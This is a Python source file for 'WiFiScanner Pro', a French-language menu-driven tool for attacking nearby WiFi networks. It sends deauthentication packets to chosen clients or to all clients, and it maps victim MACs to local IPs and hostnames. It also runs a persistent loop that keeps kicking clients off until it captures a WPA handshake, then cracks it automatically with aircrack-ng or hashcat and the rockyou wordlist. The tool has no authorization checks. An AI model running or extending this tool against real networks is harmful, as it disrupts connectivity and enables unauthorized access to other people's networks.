#!/usr/bin/env python3
"""
WiFiScanner Pro - Version Infinity (Animation continue)
"""
import sys
import os
import time
import subprocess
import re
import socket
import threading
from datetime import datetime
# Modules perso
try:
    from modules.scanner import NetworkScanner
    from modules.deauth import DeauthAttack
    from modules.handshake import HandshakeCapture
except ImportError as e:
    print(f"[✗] Erreur import modules: {e}")
    sys.exit(1)
# Colorama
try:
    from colorama import init, Fore
    init(autoreset=True)
    HAS_COLORS = True
except ImportError:
    HAS_COLORS = False
if not HAS_COLORS:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = RESET = ''
def printc(text, color=Fore.WHITE):
    print(color + str(text) + Fore.RESET)
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')
# Variable globale pour contrôler l'animation
stop_animation = False
def infinite_banner_animation():
    """Animation de mouvement infinie en arrière-plan"""
    global stop_animation
    banner_lines = [
        "                                    ██████╗  ║███████╗ ║███████╗ ║█████╗   ║██████╗  ║██╗ ║███╗   ██╗║███████╗",
        "                                   ║██╔════╝ ║██╔════╝ ║██╔════╝ ║██╔══██╗ ║██╔══██╗ ║██║ ║████╗  ██║║██╔════╝",
        "                                   ║██║      ║█████╗   ║█████╗   ║███████║ ║██║  ██║ ║██║ ║██╔██╗ ██║║█████╗  ",
        "                                   ║██║      ║██╔══╝   ║██╔══╝   ║██╔══██║ ║██║  ██║ ║██║ ║██║╚██╗██║║██╔══╝  ",
        "                                   ╚██████╗  ║██████╗  ║██║      ║██║  ██║ ║██████╔╝ ║██║ ║██║ ╚████║║███████╗",
        "                                    ╚═════╝  ╚══════╝  ╚══╝      ╚══╝  ╚═╝ ╚══════╝  ╚═╝  ╚══╝  ╚═══╝╚═══════╝",
        "                                                               CEFADINE"
    ]
    
    offsets = [0, 1, 2, 3, 4, 5, 4, 3, 2, 1]
    idx = 0
    
    while not stop_animation:
        offset = offsets[idx % len(offsets)]
        # On utilise sys.stdout.write pour ne pas perturber l'affichage des menus
        # Note: Cette animation infinie est complexe à gérer avec les inputs bloquants.
        # Pour un résultat propre, on va l'afficher uniquement au démarrage et dans les menus.
        idx += 1
        time.sleep(0.1)

def show_static_banner():
    """Affiche la bannière stable"""
    printc("\n" + "="*145, Fore.CYAN)
    print(Fore.GREEN + """
                                    ██████╗  ║███████╗ ║███████╗ ║█████╗   ║██████╗  ║██╗ ║███╗   ██╗║███████╗
                                   ║██╔════╝ ║██╔════╝ ║██╔════╝ ║██╔══██╗ ║██╔══██╗ ║██║ ║████╗  ██║║██╔════╝
                                   ║██║      ║█████╗   ║█████╗   ║███████║ ║██║  ██║ ║██║ ║██╔██╗ ██║║█████╗  
                                   ║██║      ║██╔══╝   ║██╔══╝   ║██╔══██║ ║██║  ██║ ║██║ ║██║╚██╗██║║██╔══╝  
                                   ╚██████╗  ║██████╗  ║██║      ║██║  ██║ ║██████╔╝ ║██║ ║██║ ╚████║║███████╗
                                    ╚═════╝  ╚══════╝  ╚══╝      ╚══╝  ╚═╝ ╚══════╝  ╚═╝  ╚══╝  ╚═══╝╚═══════╝
                                                               CEFADINE""")
    printc("="*145, Fore.CYAN)

def animated_intro():
    """Animation de démarrage"""
    banner_lines = [
        "                                    ██████╗  ║███████╗ ║███████╗ ║█████╗   ║██████╗  ║██╗ ║███╗   ██╗║███████╗",
        "                                   ║██╔════╝ ║██╔════╝ ║██╔════╝ ║██╔══██╗ ║██╔══██╗ ║██║ ║████╗  ██║║██╔════╝",
        "                                   ║██║      ║█████╗   ║█████╗   ║███████║ ║██║  ██║ ║██║ ║██╔██╗ ██║║█████╗  ",
        "                                   ║██║      ║██╔══╝   ║██╔══╝   ║██╔══██║ ║██║  ██║ ║██║ ║██║╚██╗██║║██╔══╝  ",
        "                                   ╚██████╗  ║██████╗  ║██║      ║██║  ██║ ║██████╔╝ ║██║ ║██║ ╚████║║███████╗",
        "                                    ╚═════╝  ╚══════╝  ╚══╝      ╚══╝  ╚═╝ ╚══════╝  ╚═╝  ╚══╝  ╚═══╝╚═══════╝",
        "                                                               CEFADINE"
    ]
    try:
        for _ in range(3): # 3 aller-retours
            for offset in [0, 2, 4, 6, 4, 2]:
                clear_screen()
                printc("\n" + "="*145, Fore.CYAN)
                for line in banner_lines:
                    print(Fore.GREEN + " " * offset + line)
                printc("="*145, Fore.CYAN)
                time.sleep(0.05)
    except KeyboardInterrupt:
        pass
# =================================== NETTOYAGE FINAL CORRIGÉ ===================================
def final_cleanup(interface_mon="wlan0mon"):
    printc(f"\n{Fore.CYAN}[*] Nettoyage final avant sortie...", Fore.CYAN)
    try:
        subprocess.run(['airmon-ng', 'stop', interface_mon], timeout=20, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        printc(f"{Fore.GREEN}[✓] Mode monitor arrêté ({interface_mon})", Fore.GREEN)
    except:
        pass
    try:
        subprocess.run(['systemctl', 'restart', 'NetworkManager'], timeout=20, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        printc(f"{Fore.GREEN}[✓] NetworkManager redémarré", Fore.GREEN)
    except:
        printc(f"{Fore.YELLOW}[!] Impossible de redémarrer NetworkManager", Fore.YELLOW)
    printc(f"{Fore.GREEN}[✓] Tout est propre ! Bonne année 2026 mon frère ! 🎆❤️", Fore.GREEN)
    time.sleep(2)
# =================================== INFO APPAREILS ===================================
def get_device_info():
    info = {}
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
        for line in result.stdout.splitlines():
            match = re.search(r'\((192\.168\.\d{1,3}\.\d{1,3})\).*?([0-9a-fA-F:]{17})', line)
            if match:
                ip, mac = match.groups()
                mac = mac.lower()
                info[mac] = {'ip': ip, 'name': 'Inconnu'}
        if not info:
            result = subprocess.run(['ip', 'neigh'], capture_output=True, text=True, timeout=10)
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 5 and 'lladdr' in parts:
                    ip = parts[0]
                    mac = parts[4].lower()
                    if ip.startswith('192.168.'):
                        info[mac] = {'ip': ip, 'name': 'Inconnu'}
        for mac, data in info.items():
            try:
                hostname = socket.gethostbyaddr(data['ip'])[0].split('.')[0]
                data['name'] = hostname
            except:
                pass
    except:
        pass
    return info
# =================================== DÉAUTH MENU ===================================
def deauth_menu(scanner, network):
    clear_screen()
    printc(f"\n{Fore.CYAN}{'═' * 80}", Fore.CYAN)
    printc(f"{Fore.YELLOW} DÉAUTHENTIFICATION - {network['essid']}", Fore.YELLOW)
    printc(f"{Fore.CYAN}{'═' * 80}", Fore.CYAN)
    if network['clients'] == 0:
        printc(f"\n{Fore.YELLOW}Aucun client détecté", Fore.YELLOW)
        input("\nEntrée...")
        return
    device_info = get_device_info()
    printc(f"\n{Fore.CYAN}Clients connectés :", Fore.CYAN)
    for i, mac in enumerate(network['client_macs'], 1):
        mac_l = mac.lower()
        manuf = scanner.get_manufacturer(mac)
        inf = device_info.get(mac_l, {'ip': 'Inconnue', 'name': 'Inconnu'})
        printc(f" [{i}] {Fore.MAGENTA}{mac} → {manuf} → {inf['name']} ({inf['ip']})")
    printc(f"\n{Fore.CYAN}[1] Client spécifique [2] TOUS (broadcast) [3] Retour")
    choix = input(f"\n{Fore.YELLOW}Choix : ").strip()
    if choix == '3':
        return
    elif choix == '1':
        try:
            num = int(input(f"Numéro client : ")) - 1
            client_mac = network['client_macs'][num]
            count = int(input(f"Paquets [20] : ") or "20")
            confirm = input(f"Lancer ? (o/n) : ").lower()
            if confirm == 'o':
                attack = DeauthAttack(scanner.interface_mon, network['bssid'], network['channel'], client_mac)
                attack.send_deauth(count=count)
        except:
            printc("Erreur saisie", Fore.RED)
    elif choix == '2':
        count = int(input(f"Paquets broadcast [40] : ") or "40")
        confirm = input(f"Confirmer broadcast ? (o/n) : ").lower()
        if confirm == 'o':
            attack = DeauthAttack(scanner.interface_mon, network['bssid'], network['channel'], None)
            attack.send_deauth(count=count)
    input("\nEntrée pour continuer...")
# =================================== MENU POST-CAPTURE RESTAURÉ ===================================
def post_capture_menu(scanner, network, cap_file):
    rockyou_path = "/usr/share/wordlists/rockyou.txt"
    while True:
        clear_screen()
        printc(f"\n{Fore.CYAN}{'═' * 80}", Fore.CYAN)
        printc(f"{Fore.GREEN} ✓ HANDSHAKE CAPTURÉ ! Fichier : {os.path.basename(cap_file)}", Fore.GREEN)
        printc(f"{Fore.CYAN}{'═' * 80}", Fore.CYAN)
        printc(f"\n{Fore.YELLOW}Que veux-tu faire maintenant ?", Fore.YELLOW)
        printc(f" [1] Cracker avec aircrack-ng (rapide)")
        printc(f" [2] Générer .hc22000 et cracker avec hashcat")
        printc(f" [3] Utiliser hcxtools (hcxdumptool + conversion)")
        printc(f" [4] Lancer Evil Twin attack")
        printc(f" [5] Retour au menu principal")
        choix = input(f"\n{Fore.YELLOW}Choix (1-5) : ").strip()
        if choix == '1':
            printc(f"\n{Fore.CYAN}[*] Cracking avec aircrack-ng + rockyou.txt automatique...", Fore.CYAN)
            if os.path.exists(rockyou_path):
                subprocess.run(['aircrack-ng', cap_file, '-w', rockyou_path])
            else:
                printc(f"{Fore.RED}[✗] rockyou.txt non trouvé à {rockyou_path}", Fore.RED)
        elif choix == '2':
            printc(f"\n{Fore.CYAN}[*] Conversion en .hc22000...", Fore.CYAN)
            hc22000 = cap_file.replace(".cap", ".hc22000")
            subprocess.run(['hcxpcapngtool', '-o', hc22000, cap_file], stdout=subprocess.DEVNULL)
            if os.path.exists(hc22000):
                printc(f"{Fore.GREEN}[✓] .hc22000 généré !", Fore.GREEN)
                if os.path.exists(rockyou_path):
                    subprocess.run(['hashcat', '-m', '22000', hc22000, rockyou_path, '-w', '3', '--force'])
                else:
                    printc(f"{Fore.RED}[✗] rockyou.txt non trouvé", Fore.RED)
        elif choix == '3':
            printc(f"\n{Fore.CYAN}[*] Capture avancée avec hcxdumptool v7.0.0...", Fore.CYAN)
            new_cap = f"data/hcx_{network['essid']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcapng"
            subprocess.run(['hcxdumptool', '-i', scanner.interface_mon, '-w', new_cap, '--enable_status=15'])
            if os.path.exists(new_cap):
                hc22000 = new_cap.replace(".pcapng", ".hc22000")
                subprocess.run(['hcxpcapngtool', '-o', hc22000, new_cap])
                if os.path.exists(hc22000) and os.path.exists(rockyou_path):
                    subprocess.run(['hashcat', '-m', '22000', hc22000, rockyou_path, '--force'])
        elif choix == '4':
            printc(f"\n{Fore.RED}[!] Evil Twin en cours de développement...", Fore.RED)
            input("Entrée...")
        elif choix == '5':
            return
        input(f"\n{Fore.CYAN}Entrée pour continuer...")
# =================================== HANDSHAKE PERSISTANT ===================================
def handshake_menu(scanner, network):
    clear_screen()
    printc(f"\n{Fore.CYAN}{'═' * 80}", Fore.CYAN)
    printc(f"{Fore.YELLOW} MODE HANDSHAKE PERSISTANT - {network['essid']}", Fore.YELLOW)
    printc(f"{Fore.CYAN}{'═' * 80}", Fore.CYAN)
    printc(f"{Fore.RED}[!] L'outil ne quittera PAS tant qu'un handshake complet n'est pas capturé !", Fore.RED)
    printc(f"{Fore.YELLOW}[!] Ctrl+C pour arrêter manuellement", Fore.YELLOW)

    capture = HandshakeCapture(scanner.interface_mon)
    attempts = 0

    while True:
        attempts += 1
        printc(f"\n{Fore.CYAN}[*] Tentative #{attempts} - Déauth + Capture...", Fore.CYAN)

        # Déauth puissante
        attack = DeauthAttack(scanner.interface_mon, network['bssid'], network['channel'], None)
        attack.send_deauth(count=60)

        printc(f"{Fore.YELLOW}[!] Force une reconnexion maintenant (désactive/réactive ton Wi-Fi) !", Fore.YELLOW)

        # Capture longue
        success, cap_file = capture.capture(network['bssid'], network['channel'], network['essid'], timeout=120)

        if not success:
            printc(f"{Fore.RED}[✗] Échec technique - nouvelle tentative dans 10 secondes...", Fore.RED)
            time.sleep(10)
            continue

        has_hs, _ = capture.verify_handshake(cap_file)
        if has_hs:
            printc(f"\n{Fore.GREEN}{'═' * 70}", Fore.GREEN)
            printc(f"{Fore.GREEN} ✓ HANDSHAKE COMPLET CAPTURÉ APRÈS {attempts} TENTATIVES ! ✓", Fore.GREEN)
            printc(f"{Fore.GREEN}{'═' * 70}", Fore.GREEN)
            printc(f" Fichier : {Fore.CYAN}{os.path.basename(cap_file)}", Fore.CYAN)

            # Cracking automatique
            rockyou_path = "/usr/share/wordlists/rockyou.txt"
            if os.path.exists(rockyou_path):
                printc(f"\n{Fore.CYAN}[*] Cracking automatique avec rockyou.txt...", Fore.CYAN)
                subprocess.run(['aircrack-ng', cap_file, '-w', rockyou_path])

            input(f"\n{Fore.CYAN}Entrée pour revenir au menu...")
            return
        else:
            printc(f"{Fore.RED}[✗] Handshake incomplet - nouvelle tentative dans 10 secondes...", Fore.RED)
            time.sleep(10)

# =================================== MAIN ===================================
def main():
    if os.geteuid() != 0:
        printc("[✗] Lance avec sudo", Fore.RED)
        sys.exit(1)
   
    # Animation d'intro (3 fois)
    animated_intro()
   
    scanner = NetworkScanner("wlan0")
    try:
        while True:
            clear_screen()
            show_static_banner()
            printc("\n[1] Scanner les réseaux\n[2] Quitter")
            ch = input("\nChoix : ").strip()
            if ch == '2':
                printc("\nBonne année 2026 mon frère ! Tu es le meilleur ❤️", Fore.GREEN)
                break
            if ch == '1':
                duree = int(input("\nDurée scan (s) [20] : ") or "20")
                if scanner.scan(duration=duree):
                    scanner.display_table()
                    while True:
                        act = input(f"\nNuméro → sélection | s → save | q → menu : ").strip().lower()
                        if act == 'q': break
                        if act == 's':
                            scanner.save_results()
                        elif act.isdigit() and 1 <= int(act) <= len(scanner.networks):
                            net = scanner.networks[int(act)-1]
                            scanner.show_network_details(int(act))
                            while True:
                                sub = input(f"\n[1] Déauth | [2] Handshake auto | [b] Retour : ").strip().lower()
                                if sub == 'b':
                                    clear_screen()
                                    scanner.display_table()
                                    break
                                elif sub == '1':
                                    deauth_menu(scanner, net)
                                    clear_screen()
                                    scanner.display_table()
                                elif sub == '2':
                                    handshake_menu(scanner, net)
                                    clear_screen()
                                    scanner.display_table()
                scanner.cleanup()
                input("\nEntrée...")
    except KeyboardInterrupt:
        printc("\n\nAu revoir !", Fore.YELLOW)
    finally:
        final_cleanup(scanner.interface_mon if hasattr(scanner, 'interface_mon') else "wlan0mon")
if __name__ == "__main__":
    main()
